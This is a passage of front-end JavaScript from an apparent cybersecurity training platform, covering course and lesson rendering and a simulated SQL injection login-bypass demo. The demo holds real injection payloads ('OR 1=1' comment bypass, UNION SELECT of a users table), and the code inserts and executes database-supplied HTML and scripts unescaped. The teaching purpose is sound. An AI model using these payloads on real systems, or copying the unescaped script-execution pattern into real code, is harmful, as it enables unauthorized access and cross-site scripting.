                <div class="streak-corner">${streak > 0 ? `🔥 ${streak} day streak` : ''}</div>
                <h1>⚡ ZentinelS Learning Platform</h1>
                <p>Master cybersecurity through interactive courses, live demos, and hands-on lab exercises. Sharpen your offensive and defensive security skills.</p>
                <a href="#/courses" class="btn btn-primary">Browse Courses →</a>
            </div>

            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon blue">📚</div>
                    <div class="stat-info"><div class="stat-value">${courses.length}</div><div class="stat-label">Courses</div></div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon green">📝</div>
                    <div class="stat-info"><div class="stat-value">${lessons.length}</div><div class="stat-label">Lessons</div></div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon purple">✅</div>
                    <div class="stat-info"><div class="stat-value">${completed}</div><div class="stat-label">Completed</div></div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon yellow">🔄</div>
                    <div class="stat-info"><div class="stat-value">${state.progress.filter((p) => p.lessonStatus === 'in_progress').length}</div><div class="stat-label">In Progress</div></div>
                </div>
                </div>
            </div>

            <div class="section-header"><h2>Featured Courses</h2></div>
            <div class="courses-grid" id="dashCourses"></div>
        `;

        const g = $('#dashCourses');
        // Featured courses in specific order: Offensive Security, Computer Components, Web
        const featuredSlugs = ['offensive-security', 'computer-components', 'web'];
        const featuredCourses = featuredSlugs
            .map(slug => courses.find(c => c.slug === slug))
            .filter(Boolean);
        featuredCourses.forEach((course) => g.appendChild(courseCardEl(course)));
    }

    /* ---- Courses List ---- */
    async function renderCourses() {
        const c = content();
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading courses…</span></div>';
        const courses = await loadCourses();
        c.innerHTML = `<div class="section-header"><h2>All Courses</h2></div><div class="courses-grid" id="coursesGrid"></div>`;
        const g = $('#coursesGrid');
        if (courses.length === 0) { g.innerHTML = '<div class="empty-state"><div class="icon">📚</div><p>No courses available yet.</p></div>'; return; }
        courses.forEach((course) => g.appendChild(courseCardEl(course)));
    }

    function courseCardEl(course) {
        const color = course.color || '#4c9aff';
        const d = el('div', 'course-card');
        const lessonCount = course.lessonCount || 0;
        const levelCount = course.levelCount || 0;
        d.innerHTML = `
            <div class="course-card-banner" style="background:linear-gradient(135deg,${color},${color}99)"></div>
            <div class="course-card-body">
                <div class="course-card-icon-row">
                    <div class="course-card-icon">${course.icon || '📘'}</div>
                    <span class="meta-badge ${(course.difficulty || 'beginner').toLowerCase()}">${esc(course.difficulty || 'Beginner')}</span>
                </div>
                <h3>${esc(course.title)}</h3>
                <p>${esc(course.description || '')}</p>
                <div class="course-card-meta">
                    <span class="meta-badge info">📖 ${lessonCount} lesson${lessonCount !== 1 ? 's' : ''}</span>
                    <span class="meta-badge info">🎯 ${levelCount} level${levelCount !== 1 ? 's' : ''}</span>
                </div>
                <div class="course-card-action">
                    <span class="course-start-link">Explore Course →</span>
                </div>
            </div>`;
        d.onclick = () => navigate(`/courses/${course.slug}`);
        return d;
    }

    /* ---- Course Detail ---- */
    async function renderCourseDetail(match) {
        const c = content();
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading course…</span></div>';
        const slug = match[1];
        const data = await loadCourseDetail(slug);
        if (!data) { c.innerHTML = '<div class="empty-state"><div class="icon">😕</div><p>Course not found.</p></div>'; return; }
        const course = data.course || data;
        const levels = data.levels || course.levels || [];
        const totalLessons = levels.reduce((sum, l) => sum + (l.lessons || []).length, 0);
        const completedLessons = levels.reduce((sum, l) => sum + (l.lessons || []).filter(ls => isLessonCompleted(ls.id)).length, 0);
        const progressPct = totalLessons > 0 ? Math.round((completedLessons / totalLessons) * 100) : 0;

        c.innerHTML = `
            <div class="course-detail-page">
                <div class="course-header-enhanced">
                    <div class="course-header-top">
                        <button class="back-btn" onclick="location.hash='#/courses'">← All Courses</button>
                    </div>
                    <div class="course-header-content">
                        <div class="course-header-icon" style="background:${course.color || '#4c9aff'}22;color:${course.color || '#4c9aff'}">${course.icon || '📘'}</div>
                        <div class="course-header-info">
                            <h1>${esc(course.title)}</h1>
                            <p class="course-header-desc">${esc(course.description || '')}</p>
                            <div class="course-header-badges">
                                <span class="meta-badge ${(course.difficulty||'beginner').toLowerCase()}">${esc(course.difficulty||'Beginner')}</span>
                                <span class="meta-badge info">📖 ${totalLessons} lessons</span>
                                <span class="meta-badge info">🎯 ${levels.length} levels</span>
                                ${state.user ? `<span class="meta-badge ${progressPct === 100 ? 'beginner' : 'info'}">${progressPct === 100 ? '✅' : '📊'} ${progressPct}% complete</span>` : ''}
                            </div>
                        </div>
                    </div>
                    ${state.user && totalLessons > 0 ? `
                    <div class="course-progress-bar-wrapper">
                        <div class="course-progress-bar"><div class="course-progress-fill" style="width:${progressPct}%;background:${course.color || '#4c9aff'}"></div></div>
                        <span class="course-progress-text">${completedLessons}/${totalLessons} lessons completed</span>
                    </div>` : ''}
                    ${state.user ? renderCertificateSection(course, totalLessons, completedLessons) : ''}
                </div>
                <div class="levels-timeline" id="levelsContainer"></div>
            </div>`;

        const lc = $('#levelsContainer');
        // Filter out levels with 0 lessons (like Introduction levels)
        const activeLevels = levels.filter(l => (l.lessons || []).length > 0);
        if (activeLevels.length === 0) { lc.innerHTML = '<div class="empty-state"><p>No lessons available yet. Check back soon!</p></div>'; return; }

        activeLevels.forEach((level, i) => {
            const card = el('div', `level-card ${i === 0 ? 'expanded' : ''}`);
            const lessons = level.lessons || [];
            const levelCompleted = lessons.length > 0 && lessons.every(ls => isLessonCompleted(ls.id));
            const levelStarted = lessons.some(ls => isLessonStarted(ls.id));

            card.innerHTML = `
                <div class="level-header">
                    <div class="level-number ${levelCompleted ? 'completed' : levelStarted ? 'started' : ''}">${levelCompleted ? '✓' : level.levelNumber || i + 1}</div>
                    <div class="level-info">
                        <h3>${esc(level.title)}</h3>
                        <p>${esc(level.description || '')}</p>
                    </div>
                    <div class="level-stats">
                        <span class="level-lesson-count">${lessons.length} lesson${lessons.length !== 1 ? 's' : ''}</span>
                        ${levelCompleted ? '<span class="level-status-badge completed">✅ Completed</span>' : levelStarted ? '<span class="level-status-badge in-progress">🔄 In Progress</span>' : ''}
                    </div>
                    <div class="level-chevron">▶</div>
                </div>
                <div class="level-lessons">
                    ${lessons.map((ls, li) => {
                        const lessonDone = isLessonCompleted(ls.id);
                        const lessonInProgress = isLessonStarted(ls.id) && !lessonDone;
                        const prog = getLessonProgress(ls.id);
                        const difficultyColor = (ls.difficulty || 'beginner') === 'advanced' ? '#e53e3e' : (ls.difficulty || 'beginner') === 'intermediate' ? '#d69e2e' : '#38a169';
                        const statusIcon = lessonDone ? '✅' : lessonInProgress ? '🔄' : '📄';
                        const statusLabel = lessonDone ? 'Completed' : lessonInProgress ? 'In Progress' : 'Not Started';
                        return `
                        <div class="lesson-list-item ${lessonDone ? 'completed' : lessonInProgress ? 'in-progress' : ''}" data-slug="${ls.slug}">
                            <div class="lesson-list-number">${li + 1}</div>
                            <div class="lesson-list-icon">${statusIcon}</div>
                            <div class="lesson-list-info">
                                <h4>${esc(ls.title)}</h4>
                                <span>${esc(ls.summary || ls.description || ls.categoryName || '')}</span>
                            </div>
                            <div class="lesson-list-meta">
                                <span class="lesson-status-label ${lessonDone ? 'done' : lessonInProgress ? 'progress' : 'new'}">${statusLabel}</span>
                                <span class="difficulty-dot" style="background:${difficultyColor}" title="${esc(ls.difficulty || 'beginner')}"></span>
                                ${prog && prog.quizScore > 0 ? `<span class="quiz-score-badge">${prog.quizScore}%</span>` : ''}
                                <span class="lesson-arrow">→</span>
                            </div>
                        </div>`;
                    }).join('')}
                </div>`;
            card.querySelector('.level-header').onclick = () => card.classList.toggle('expanded');
            card.querySelectorAll('.lesson-list-item').forEach((li) => li.addEventListener('click', () => navigate(`/lesson/${li.dataset.slug}`)));
            lc.appendChild(card);
        });
    }

    /* ---- All Lessons ---- */
    async function renderAllLessons() {
        const c = content();
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading lessons…</span></div>';
        const lessons = await loadLessons();

        const cats = [...new Set(lessons.map((l) => l.categoryName || 'Uncategorized'))];
        c.innerHTML = `
            <div class="section-header"><h2>All Lessons</h2></div>
            <div class="category-filter" id="catFilter">
                <span class="category-pill active" data-cat="all">All</span>
                ${cats.map((cat) => `<span class="category-pill" data-cat="${esc(cat)}">${esc(cat)}</span>`).join('')}
            </div>
            <div class="lessons-grid" id="lessonsGrid"></div>`;

        const g = $('#lessonsGrid');
        function render(filter) {
            g.innerHTML = '';
            lessons.filter((l) => filter === 'all' || (l.categoryName || 'Uncategorized') === filter)
                .forEach((l) => {
                    const card = el('div', 'lesson-card');
                    card.innerHTML = `
                        <div class="card-top"><span class="category-tag">${esc(l.categoryName || '')}</span></div>
                        <h3>${esc(l.title)}</h3>
                        <p>${esc(l.description || '')}</p>
                        <div class="card-action"><span class="btn btn-primary btn-sm">Start Lesson →</span></div>`;
                    card.onclick = () => navigate(`/lesson/${l.slug}`);
                    g.appendChild(card);
                });
            if (!g.children.length) g.innerHTML = '<div class="empty-state"><p>No lessons in this category.</p></div>';
        }

        render('all');
        $$('.category-pill').forEach((p) => p.onclick = () => {
            $$('.category-pill').forEach((x) => x.classList.remove('active'));
            p.classList.add('active');
            render(p.dataset.cat);
        });
    }

    /* ---- Lesson Detail ---- */
    async function renderLessonDetail(match) {
        const c = content();
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading lesson…</span></div>';
        const slug = match[1];
        const [lesson] = await Promise.all([loadLesson(slug), loadLessons()]); // Load lessons for related section
        if (!lesson) { c.innerHTML = '<div class="empty-state"><div class="icon">😕</div><p>Lesson not found.</p></div>'; return; }
        state.currentLesson = lesson;

        const prog = getLessonProgress(lesson.id);
        const lessonDone = isLessonCompleted(lesson.id);
        const lessonInProgress = isLessonStarted(lesson.id) && !lessonDone;
        const statusText = lessonDone ? '✅ Completed' : lessonInProgress ? '🔄 In Progress' : '📄 Not Started';
        const statusClass = lessonDone ? 'done' : lessonInProgress ? 'progress' : 'new';

        c.innerHTML = `
            <div class="lesson-detail-header">
                <button class="back-btn" id="lessonBack">← Back</button>
                <div class="lesson-detail-info">
                    <h1>${esc(lesson.title)}</h1>
                    <div class="lesson-meta">
                        <span class="meta-badge info">${esc(lesson.categoryName || '')}</span>
                        <span class="meta-badge ${(lesson.difficulty || 'beginner').toLowerCase()}">${esc(lesson.difficulty || 'Beginner')}</span>
                        <span class="lesson-status-indicator ${statusClass}">${statusText}</span>
                    </div>
                    <p class="lesson-summary">${esc(lesson.summary || '')}</p>
                </div>
                ${state.user ? `
                <div class="lesson-tracking-bar">
                    <div class="tracking-sections">
                        <span class="tracking-item ${prog && prog.demoCompleted ? 'done' : ''}">🎯 Demo ${prog && prog.demoCompleted ? '✓' : ''}</span>
                        <span class="tracking-item ${prog && prog.labCompleted ? 'done' : ''}">🔬 Lab ${prog && prog.labCompleted ? '✓' : ''}</span>
                        <span class="tracking-item ${prog && prog.quizCompleted ? 'done' : ''}">❓ Quiz ${prog && prog.quizCompleted ? `✓ (${prog.quizScore}%)` : ''}</span>
                    </div>
                    <div class="lesson-action-btns">
                        ${lessonDone ? '<span class="lesson-complete-badge">✅ Lesson Completed</span>' :
                          lessonInProgress ? `<button class="btn btn-primary btn-sm" id="completeLessonBtn">✓ Mark Complete</button>` :
                          `<button class="btn btn-primary btn-sm" id="startLessonBtn">▶ Start Lesson</button>`}
                    </div>
                </div>` : ''}
            </div>
            <div class="lesson-tabs">
                <button class="lesson-tab active" data-tab="theory">📖 Theory</button>
                <button class="lesson-tab" data-tab="demo">🎯 Live Demo</button>
                <button class="lesson-tab" data-tab="lab">🔬 Lab</button>
                <button class="lesson-tab" data-tab="quiz">❓ Quiz</button>
            </div>
            <div class="tab-content-area">
                <div class="tab-pane active" id="pane-theory"></div>
                <div class="tab-pane" id="pane-demo"></div>
                <div class="tab-pane" id="pane-lab"></div>
                <div class="tab-pane" id="pane-quiz"></div>
            </div>`;

        // Back
        $('#lessonBack').onclick = () => history.back();

        // Start/Complete lesson buttons
        const startBtn = $('#startLessonBtn');
        const completeBtn = $('#completeLessonBtn');
        if (startBtn) {
            startBtn.onclick = async () => {
                try {
                    await api(`/progress/start/${lesson.id}`, { method: 'POST' });
                    await loadProgress();
                    toast('Lesson started! 🚀', 'success');
                    renderLessonDetail(match); // Re-render to update UI
                } catch (e) { toast('Failed to start lesson', 'error'); }
            };
        }
        if (completeBtn) {
            completeBtn.onclick = async () => {
                try {
                    await api(`/progress/complete/${lesson.id}`, { method: 'POST' });
                    await loadProgress();
                    toast('Lesson completed! 🎉', 'success');
                    renderLessonDetail(match); // Re-render to update UI
                } catch (e) { toast('Failed to complete lesson', 'error'); }
            };
        }

        // Tabs
        $$('.lesson-tab').forEach((tab) => {
            tab.onclick = () => {
                $$('.lesson-tab').forEach((t) => t.classList.remove('active'));
                $$('.tab-pane').forEach((p) => p.classList.remove('active'));
                tab.classList.add('active');
                $(`#pane-${tab.dataset.tab}`).classList.add('active');
            };
        });

        // Render content for each tab
        renderTheory(lesson);
        renderDemo(lesson);
        renderLab(lesson);
        renderQuizTab(lesson);
    }

    /* ---- Theory Tab ---- */
    function renderTheory(lesson) {
        const pane = $('#pane-theory');
        // Content is now loaded from database via API (lessons.description column)
        const content = lesson.description || lesson.content || lesson.contentHtml || '';
        const readingTime = getReadingTime(content);
        
        if (content && content.trim().length > 100) {
            // Rich content from database with reading time and related lessons
            pane.innerHTML = `
                <div class="lesson-theory">
                    <div style="margin-bottom:16px;">
                        ${renderReadingTime(readingTime)}
                    </div>
                    ${content}
                    ${renderRelatedLessons(lesson)}
                </div>
            `;
        } else {
            // Fallback for lessons without rich content
            pane.innerHTML = `<div class="lesson-theory">
                <h2>${esc(lesson.title)}</h2>
                <p>${esc(lesson.summary || 'Content for this lesson is being prepared.')}</p>
                ${renderRelatedLessons(lesson)}
            </div>`;
        }
        
        // Add click handlers for related lessons
        pane.querySelectorAll('.related-lesson-card').forEach(card => {
            card.addEventListener('click', () => navigate(`/lesson/${card.dataset.slug}`));
        });
    }

    /* ============================================================
       INTERACTIVE DEMOS
       ============================================================ */
    function renderDemo(lesson) {
        const pane = $('#pane-demo');
        const slug = lesson.slug || '';
        const demoKey = (lesson.demoHtml || slug).replace('-demo', '');
        const generators = {
            'sql-injection': demoSQLi,
            'sqli-demo': demoSQLi,
            'sqli': demoSQLi,
            'cross-site-scripting': demoXSS,
            'xss-demo': demoXSS,
            'xss': demoXSS,
            'csrf-attack': demoCSRF,
            'csrf-demo': demoCSRF,
            'csrf': demoCSRF,
            'broken-authentication': demoBrokenAuth,
            'brokenauth-demo': demoBrokenAuth,
            'brokenauth': demoBrokenAuth,
            'auth-demo': demoBrokenAuth,
            'auth': demoBrokenAuth,
            'broken-auth-101': demoBrokenAuth,
            'idor': demoIDOR,
            'idor-demo': demoIDOR,
            'command-injection': demoCmdInjection,
            'cmdi-demo': demoCmdInjection,
            'cmdi': demoCmdInjection,
            'path-traversal': demoPathTraversal,
            'path-demo': demoPathTraversal,
            'path': demoPathTraversal,
            'security-misconfiguration': demoMisconfig,
            'misconfig-demo': demoMisconfig,
            'misconfig': demoMisconfig,
            'sql-injection-101': demoSQLi,
            'xss-101': demoXSS,
            'csrf-101': demoCSRF,
            'broken-auth-101': demoBrokenAuth,
            'idor-101': demoIDOR,
            'command-injection-101': demoCmdInjection,
            'path-traversal-101': demoPathTraversal,
            'security-misconfig-101': demoMisconfig,
            'file-inclusion': demoFileInclusion,
            'file-inclusion-101': demoFileInclusion,
            'lfi': demoFileInclusion,
            'fi-demo': demoFileInclusion,

            // C1 Demos
            'motherboard-demo': demoBoardSize,
            'motherboards': demoBoardSize,
            'cpu-demo': demoCPU,
            'cpus-processing': demoCPU,
            'ram-demo': demoRAM,
            'ram-storage': demoRAM,
            'binary-demo': demoBinary,
            'bits-bytes-bases': demoBinary,
            'ascii-demo': demoASCII,
            'ascii-encoding': demoASCII,
            'base64-demo': demoBase64,
            'base64-encoding': demoBase64,
            'fileheader-demo': demoFileHeaders,
            'file-headers': demoFileHeaders,
            'logic-demo': demoLogicGates,
            'boolean-logic': demoLogicGates,
            'xor-demo': demoXOR,
            'xor-encryption': demoXOR,
            'fs-demo': demoFileSystems,
            'file-systems-overview': demoFileSystems,
            'cloud-demo': demoCloud,
            'cloud-models': demoCloud,
            // C2 Demos
            'os-demo': demoOS,
            'os-fundamentals': demoOS,
            'vm-demo': demoVM,
            'vms-hypervisors': demoVM,
            // C3 Demos
            'terminal-demo': demoTerminal,
            'linux-terminal': demoTerminal,
            'sudo-demo': demoSudo,
            'superuser-sudo': demoSudo,
            'folders-demo': demoFolders,
            'linux-folders': demoFolders,
            'permissions-demo': demoPermissions,
            'file-permissions': demoPermissions,
            'env-demo': demoEnvVars,
            'env-variables': demoEnvVars,
            'fileops-demo': demoFileOps,
            'file-operations': demoFileOps,
            'search-demo': demoSearch,
            'search-commands': demoSearch,
            'process-demo': demoProcesses,
            'processes': demoProcesses,
            'pipes-demo': demoPipes,
            'pipes-redirects': demoPipes,
            'ssh-demo': demoSSH,
            'ssh-building': demoSSH,
            // C4 Demos
            'dorks-demo': demoDorks,
            'google-dorks': demoDorks,
            'http-demo': demoHTTP,
            'http-protocol': demoHTTP,
            'cookies-demo': demoCookies,
            'cookies-storage': demoCookies,
            // C5 Demos
            'hardware-demo': demoNetHardware,
            'network-hardware': demoNetHardware,
            'ip-demo': demoIP,
            'ip-addresses': demoIP,
            'tcpudp-demo': demoTCPUDP,
            'tcp-vs-udp': demoTCPUDP,
            'subnet-demo': demoSubnet,
            'subnetting': demoSubnet,
            'spf-demo': demoSPF,
            'email-spoofing-spf': demoSPF,
            'dns-demo': demoDNS,
            'dns-records': demoDNS,
            'osi-demo': demoOSI,
            'osi-model': demoOSI,
            'dos-demo': demoDoS,
            'dos-attacks': demoDoS,
            // C6 new demos
            'session-demo': demoSessionGuessing,
            'session-guessing': demoSessionGuessing,
            'clickjack-demo': demoClickjack,
            'clickjacking': demoClickjack,
            'dirtraversal-demo': demoDirTraversal,
            'directory-traversal': demoDirTraversal,
            'upload-demo': demoFileUpload,
            'file-upload': demoFileUpload,
            'bof-demo': demoBOF,
            'buffer-overflow-intro': demoBOF,
            'intoverflow-demo': demoIntOverflow,
            'integer-overflow': demoIntOverflow,
            'msf-demo': demoMetasploit,
            'metasploit': demoMetasploit,
            'phishing-demo': demoPhishing,
            'phishing': demoPhishing,
            'privesc-demo': demoPrivEsc,
            'privesc-intro': demoPrivEsc,
            'suid-demo': demoSUID,
            'privesc-suid-sudo': demoSUID,
            'winprivesc-demo': demoWinPrivEsc,
            'privesc-windows': demoWinPrivEsc,
            // C7 Servers & Services - UNIQUE DEMOS
            'intro-to-servers': demoIntroToServers,
            'server-hardware': demoServerHardware,
            'server-software': demoServerSoftware,
            'types-of-servers': demoTypesOfServers,
            'server-challenges': demoServerChallenges,
            'server-connectivity': demoServerConnectivity,
            'web-server-intro': demoWebServerIntro,
            'what-are-web-servers': demoWhatAreWebServers,
            'how-web-servers-work': demoHowWebServersWork,
            'web-server-analytics': demoWebServerAnalytics,
            'web-server-errors': demoWebServerErrors,
            'web-server-config': demoWebServerConfig,
            'db-server-intro': demoDBServerIntro,
            'database-logic': demoDatabaseLogic,
            'sql-server-setup': demoSQLServerSetup,
            'db-admin-tools': demoDBAdminTools,
            'dns-server-intro': demoDNSServerIntro,
            'dns-theory-practice': demoDNSTheoryPractice,
            'personal-dns-server': demoPersonalDNSServer,
            'dns-security': demoDNSSecurity,
            'dns-over-https-tls': demoDNSOverHTTPS,
            'dnssec': demoDNSSEC,
            'log-server-intro': demoLogServerIntro,
            'basic-log-setup': demoBasicLogSetup,
            'sim-sem-siem': demoSIMSEMSIEM,
            'log-tools-comparison': demoLogToolsComparison,
            'security-vs-privacy': demoSecurityVsPrivacy,
            'log-best-practices': demoLogBestPractices,
            'email-server-intro': demoEmailServerIntro,
            'smtp-imap-pop3': demoSMTPIMAPPOP3,
            'email-send-process': demoEmailSendProcess,
            'spam-filters': demoSpamFilters,
            'email-response-codes': demoEmailResponseCodes,
            'mime-email': demoMIMEEmail,
            'email-server-setup': demoEmailServerSetup,
            // C8 Advanced Hardware - Unique demos per lesson
            'cpu-arch-intro': demoCPUArchIntro,
            'cpu-components-adv': demoCPUComponentsAdv,
            'cpu-registers': demoCPURegisters,
            'fetch-decode-execute': demoFetchDecodeExecute,
            'stack-and-heap': demoStackAndHeap,
            'tracking-execution': demoTrackingExecution,
            'gdb-setup': demoGDBSetup,
            'debugging-techniques': demoDebuggingTechniques,
            'debugging-challenge': demoDebuggingChallenge,
            'adv-storage-intro': demoAdvStorageIntro,
            'raid-explained': demoRAIDExplained,
            'cloud-storage-mech': demoCloudStorageMech,
            'container-intro': demoContainerIntro,
            'containers-vs-vms': demoContainersVsVMs,
            'docker-intro': demoDockerIntro,
            'docker-cli-basics': demoDockerCLIBasics,
            // C9 Security Concepts - Encryption (Lessons 1-7)
            'encryption-intro': demoEncryptionIntro,
            'what-is-encryption': demoWhatIsEncryption,
            'encryption-vs-encoding': demoEncryptionVsEncoding,
            'symmetric-encryption': demoSymmetricEncryption,
            'asymmetric-encryption': demoAsymmetricEncryption,
            'https-tls': demoHTTPSTLS,
            'hashing-security': demoHashingSecurity,
            // C9 Security Law (Lessons 8-12)
            'security-law-intro': demoSecurityLawIntro,
            'law-cybersecurity': demoLawCybersecurity,
            'getting-caught': demoGettingCaught,
            'ethics-security': demoEthicsSecurity,
            'responsible-disclosure': demoResponsibleDisclosure,
            // C9 Security Fundamentals (Lessons 13-18)
            'security-fund-intro': demoSecurityFundIntro,
            'red-vs-blue-team': demoRedVsBlueTeam,
            'defense-in-depth': demoDefenseInDepth,
            'risk-management': demoRiskManagement,
            'critical-security-controls': demoCriticalSecurityControls,
            'stages-of-attack': demoStagesOfAttack,
            // C9 Security Distros (Lessons 19-22)
            'security-distros-intro': demoSecurityDistrosIntro,
            'slingshot-sift': demoSlingshotSift,
            'kali-linux': demoKaliLinux,
            'wordlists-security': demoWordlistsSecurity,
            // C9 Reconnaissance (Lessons 23-30)
            'recon-intro': demoReconIntro,
            'google-dorking-robots': demoGoogleDorking,
            'job-posting-osint': demoJobPostingOsint,
            'cewl-wordlists': demoCewlWordlists,
            'prior-breaches': demoPriorBreaches,
            'whois-lookup': demoWhoisLookup,
            'dns-recon': demoDnsRecon,
            'nmap-scanning': demoNmapScanning,
            // C9 Digital Forensics Intro (Lessons 31-37)
            'forensics-intro': demoForensicsIntro,
            'evidence-chain-custody': demoEvidenceChainCustody,
            'steganography': demoSteganography,
            'event-logs-forensics': demoEventLogsForensics,
            'file-integrity-hashes': demoFileIntegrityHashes,
            'incident-response': demoIncidentResponse,
            'security-teams-forensics': demoSecurityTeamsForensics,
            // C9 File System Forensics (Lessons 38-44)
            'fs-forensics-intro': demoFSForensicsIntro,
            'file-system-analysis': demoFileSystemAnalysis,
            'disk-capture': demoDiskCapture,
            'deleted-file-recovery': demoDeletedFileRecovery,
            'email-forensics': demoEmailForensics,
            'windows-registry-forensics': demoWindowsRegistryForensics,
            'forensic-tools': demoForensicToolsOverview,
            // C9 Anti-Forensics (Lesson 45)
            'anti-forensics': demoAntiForensics,
            // C9 Memory Forensics (Lessons 46-49)
            'memory-forensics-intro': demoMemoryForensicsIntro,
            'memory-analysis': demoMemoryAnalysis,
            'memory-captures': demoMemoryCaptures,
            'volatility-framework': demoVolatilityFramework,
            // C9 Network Forensics (Lessons 50-52)
            'network-forensics': demoNetworkForensics,
            'wireshark-tcpdump': demoWiresharkTcpdump,
            'pcap-analysis': demoPcapAnalysis,
            // C10 Network Infiltration - Persistence (Lessons 1-7)
            'persistence-intro': demoPersistenceIntro,
            'persistence-mechanisms': demoPersistenceMechanisms,
            'startup-items-persist': demoStartupItemsPersist,
            'shortcut-hijacking': demoShortcutHijacking,
            'rootkits': demoRootkits,
            'office-persistence': demoOfficePersistence,
            'yara-rules': demoYaraRules,
            // C10 Lateral Movement (Lessons 8-14)
            'lateral-movement-intro': demoLateralMovementIntro,
            'lateral-movement-tech': demoLateralMovementTech,
            'arp-cache-poisoning': demoArpCachePoisoning,
            'port-scanning-lateral': demoPortScanningLateral,
            'credential-extraction': demoCredentialExtraction,
            'mitm-lateral': demoMITMLateral,
            'psexec-remote': demoPsexecRemote,
            // C10 Data Exfiltration (Lessons 15-23)
            'exfiltration-intro': demoExfiltrationIntro,
            'exfiltration-techniques': demoExfiltrationTechniques,
            'https-exfiltration': demoHttpsExfiltration,
            'smtp-exfiltration': demoSmtpExfiltration,
            'irc-exfiltration': demoIrcExfiltration,
            'dns-exfiltration': demoDnsExfiltration,
            'icmp-exfiltration': demoIcmpExfiltration,
            'acoustic-exfiltration': demoAcousticExfiltration,
            'cloud-exfiltration': demoCloudExfiltration,
        };

        const gen = generators[slug] || generators[demoKey];
        if (gen) {
            gen(pane, lesson);
        } else if (lesson.demoHtml && lesson.demoHtml.trim()) {
            // Render demo HTML from database
            pane.innerHTML = lesson.demoHtml;
            // Execute any scripts in the demo HTML
            pane.querySelectorAll('script').forEach(oldScript => {
                const newScript = document.createElement('script');
                newScript.textContent = oldScript.textContent;
                oldScript.parentNode.replaceChild(newScript, oldScript);
            });
        } else {
            pane.innerHTML = '<div class="empty-state"><div class="icon">🎯</div><p>Demo for this lesson is coming soon.</p></div>';
        }
    }

    /* -- SQL Injection Demo -- */
    function demoSQLi(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">SQL Injection – Login Bypass</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Normal Login</button>
                    <button class="demo-step-btn" data-step="2">2. SQLi Attack</button>
                    <button class="demo-step-btn" data-step="3">3. Data Extraction</button>
                </div>

                <div class="demo-visual">
                    <div class="demo-browser">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">https://shop.example.com/login</span>
                        </div>
                        <div class="browser-content" id="demoAppContent">
                            <div class="demo-login-form">
                                <h4>🛒 ShopSecure</h4>
                                <p class="demo-subtitle">Customer Login</p>
                                <div class="demo-field"><label>Username</label><input class="demo-input" id="demoUser" value="admin"></div>
                                <div class="demo-field"><label>Password</label><input class="demo-input" id="demoPass" value="password123"></div>
                                <button class="demo-btn" style="width:100%;margin-top:8px" id="demoLoginBtn">Login</button>
                                <div class="demo-status" id="demoStatus"></div>
                            </div>
                        </div>
                    </div>
                    <div class="demo-sql-panel">
                        <div class="panel-header">📝 SQL Query Executed</div>
                        <div class="demo-sql-code" id="demoSql"><pre>Waiting for login attempt…</pre></div>
                        <div class="demo-result-panel hidden" id="demoResult">
                            <div class="panel-header result-header">📊 Query Result</div>
                            <div class="demo-sql-code" id="demoResultContent"></div>
                        </div>
                    </div>
                </div>

                <div class="demo-explanation" id="demoExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1 – Normal Login:</strong> Click Login with normal credentials. The SQL query uses string concatenation, which is safe only when the input is benign.</p>
                    </div>
                </div>
            </div>`;

        const userI = $('#demoUser'), passI = $('#demoPass'), btn = $('#demoLoginBtn');
        const sqlBox = $('#demoSql'), status = $('#demoStatus'), resultPanel = $('#demoResult'), resultContent = $('#demoResultContent');
        const explanation = $('#demoExplanation');

        function doLogin() {
            const u = userI.value, p = passI.value;
            const query = `SELECT * FROM users\nWHERE username = '${u}'\n  AND password = '${p}'`;
            sqlBox.innerHTML = `<pre>${esc(query)}</pre>`;

            const isSqli = u.includes("'") || p.includes("'");
            const isUnion = u.toLowerCase().includes('union') || p.toLowerCase().includes('union');

            if (isUnion) {
                status.className = 'demo-status show warning';
                status.innerHTML = '⚠️ Data extracted!';
                resultPanel.classList.remove('hidden');
                resultContent.innerHTML = `<pre>| id | username  | password     | email               |
|----|-----------|--------------|---------------------|
| 1  | admin     | P@ssw0rd!    | admin@shop.com      |
| 2  | john_doe  | john123      | john@example.com    |
| 3  | jane_smith| secret99     | jane@example.com    |</pre>`;
            } else if (isSqli) {
                status.className = 'demo-status show success';
                status.innerHTML = '✅ Login successful! Welcome, admin (BYPASSED)';
                resultPanel.classList.remove('hidden');
                resultContent.innerHTML = `<pre>| id | username | role  |
|----|----------|-------|
| 1  | admin    | admin |
→ 1 row returned (authentication bypassed!)</pre>`;
            } else if (u === 'admin' && p === 'password123') {
                status.className = 'demo-status show success';
                status.innerHTML = '✅ Login successful! Welcome, admin';
                resultPanel.classList.remove('hidden');
                resultContent.innerHTML = `<pre>→ 1 row returned (legitimate login)</pre>`;
            } else {
                status.className = 'demo-status show error';
                status.innerHTML = '❌ Invalid credentials';
                resultPanel.classList.add('hidden');
            }
        }

        btn.onclick = doLogin;

        // Steps
        const steps = {
            '1': { user: 'admin', pass: 'password123', text: `<p><strong>Step 1 – Normal Login:</strong> A legitimate login attempt. The query works correctly because the input doesn't contain special characters.</p>` },
            '2': { user: "' OR '1'='1' --", pass: 'anything', text: `<p><strong>Step 2 – SQL Injection Attack:</strong> The attacker enters <code>' OR '1'='1' --</code> as the username. This modifies the WHERE clause to always be true, bypassing authentication entirely.</p><p>The <code>--</code> comments out the rest of the query, ignoring the password check.</p>` },
            '3': { user: "' UNION SELECT id,username,password,email FROM users --", pass: 'x', text: `<p><strong>Step 3 – Data Extraction:</strong> Using a UNION-based injection, the attacker extracts the entire users table, revealing all usernames and passwords in the database.</p>` },
        };

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const s = steps[b.dataset.step];
